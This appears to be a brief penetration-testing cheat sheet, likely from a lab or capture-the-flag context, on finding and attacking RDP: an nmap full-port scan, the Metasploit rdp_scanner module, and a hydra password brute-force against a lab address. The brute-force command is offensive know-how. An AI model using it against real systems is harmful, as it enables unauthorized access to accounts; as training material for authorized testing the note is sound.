Using nmap to identify if the target system is using RDP. All ports should be scanned because the default port could be changed.

```plaintext
nmap -sV -p- -Pn 10.10.10.10
```

if yor not shure that the port is RDP or not, use the metasploit rdp scanner

```plaintext
msfconsole
search rdp_scanner
use auxiliary…
show options
set RHOSTS
set RPORT
```

Perform brute-force with hydra

```plaintext
hydra -L /usr/share/wordlists… -P /usr/share/wordlists… rdp://10.10.10.10 -s 3389 -t 3
```
